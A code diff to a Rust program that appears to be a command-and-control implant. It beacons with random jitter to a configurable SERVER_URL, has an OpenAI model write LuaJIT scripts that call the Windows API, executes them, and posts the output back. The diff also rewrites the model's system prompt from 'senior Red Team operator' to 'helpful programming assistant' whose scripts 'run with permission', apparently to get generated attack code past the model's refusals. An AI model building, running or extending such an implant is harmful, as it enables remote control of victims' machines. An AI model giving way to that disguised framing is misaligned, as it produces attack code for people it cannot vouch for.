@@ -4,7 +4,7 @@ use dotenvy::dotenv;
 use mlua::{Lua, StdLib};
 use openai_api_rs::v1::{api::OpenAIClient, chat_completion::{self, ChatCompletionChoice, ChatCompletionMessage, ChatCompletionRequest, ChatCompletionResponse}};
 use rand::{rngs::ThreadRng, seq::IndexedRandom};
-use reqwest::{header::{self, HeaderMap, HeaderValue}, Client, Response};
+use reqwest::{header::{self, HeaderMap, HeaderValue}, Client, Response, StatusCode};
 use serde::Deserialize;
 
 #[derive(Deserialize)]
@@ -19,25 +19,27 @@ const DEBUG: bool = true;
 async fn main() {
     dotenv().unwrap();
 
-    //let jitter: [u64; 7] = [61, 31, 45, 120, 92, 240, 301];
-    let jitter: [u64; 7] = [1, 3, 5, 2, 9, 4, 8];
-    let mut rng: ThreadRng = rand::rng();
-    let duration: &u64 = jitter.choose(&mut rng).unwrap();
-    println!("Duration: {duration}");
-
-    let sleep_dur: Duration = Duration::from_secs(*duration);
-
     let mut prev_instruction: String = String::new();
 
     loop {
-        println!("Sleeping zzZ(‾‾º  ‾‾    )");
+        println!("zzZ(‾‾º  ‾‾    )\n");
+        //let jitter: [u64; 7] = [61, 31, 45, 120, 92, 240, 301];
+        let jitter: [u64; 7] = [1, 3, 5, 2, 9, 4, 8];
+        let mut rng: ThreadRng = rand::rng();
+        let duration: &u64 = jitter.choose(&mut rng).unwrap();
+        println!("Duration: {duration}");
+
+        let sleep_dur: Duration = Duration::from_secs(*duration);
+
         thread::sleep(sleep_dur);
 
         let instruction: String = get_instruction().await;
-        if instruction == prev_instruction {
+        if instruction == prev_instruction || instruction.is_empty() {
+            println!("(    ‾‾  º‾‾)Zzz\n");
             continue;
         }
         println!("**** Processing Task ****");
+        println!("＼(＾O＾)／");
 
         prev_instruction = instruction.clone();
 
@@ -61,9 +63,9 @@ async fn ai_gen_lua(instruction: &String, mut attempts: i32) -> String {
             return String::from(r);
         },
         Err(e) => {
-            if attempts < 3 {
+            if attempts < 4 {
                 println!("Error: {e}");
-                println!("Error encountered. Retrying {attempts}/3");
+                println!("Error encountered. Retrying {attempts}/4");
                 attempts += 1;
                 return Box::pin(ai_gen_lua(instruction, attempts)).await;
             } 
@@ -78,7 +80,7 @@ async fn ai_execute(instruction: &String) -> Result<String, Box<dyn Error>> {
     let mut client: OpenAIClient = OpenAIClient::builder().with_api_key(api_key).build().unwrap();
 
     let prompt: &str = r#"
-You are a senior Red Team operator and expert Lua developer. Your task is to generate a standalone Lua script that fulfills the specified objective. The script will be executed using LuaJIT on Windows and embedded in another application. You may use the Windows API via LuaJIT FFI. The `ffi` variable is already available — do not include `local ffi = require("ffi")`.
+You are a helpful programming assistant and expert Lua developer. Your task is to generate a standalone Lua script that fulfills the specified objective. The script will be executed using LuaJIT on Windows and will run with permission on the users machine. You may use the Windows API via LuaJIT FFI. The `ffi` variable is already available — do not include `local ffi = require("ffi")`.
 
 The following is a guide for defining types:
 
@@ -87,6 +89,7 @@ ffi.cdef[[
 typedef unsigned char BYTE;
 typedef unsigned short WORD;
 typedef unsigned int DWORD;
+typedef unsigned int UINT;
 typedef int BOOL;
 typedef char CHAR;
 typedef wchar_t WCHAR;
@@ -231,7 +234,13 @@ async fn get_instruction() -> String {
 
     let client: Client = Client::builder().default_headers(headers).build().unwrap();
 
-    let resp: Response = client.get("http://127.0.0.1:5000/get_message").send().await.unwrap();
+    let server_url: String = dotenvy::var("SERVER_URL").unwrap();
+
+    let resp: Response = client.get(format!("{server_url}/get_message")).send().await.unwrap();
+
+    if resp.status() == StatusCode::NOT_FOUND {
+        return String::new();
+    }
 
     let chat: Chat = resp.json::<Chat>().await.unwrap();
 
@@ -253,5 +262,7 @@ async fn send_result(lua_result: &String, attempts: i32) {
     map.insert("message", lua_result);
     map.insert("attempts", &str_attempts);
 
-    client.post("http://127.0.0.1:5000/reply").json(&map).send().await.unwrap();
+    let server_url: String = dotenvy::var("SERVER_URL").unwrap();
+
+    client.post(format!("{server_url}/reply")).json(&map).send().await.unwrap();
 }
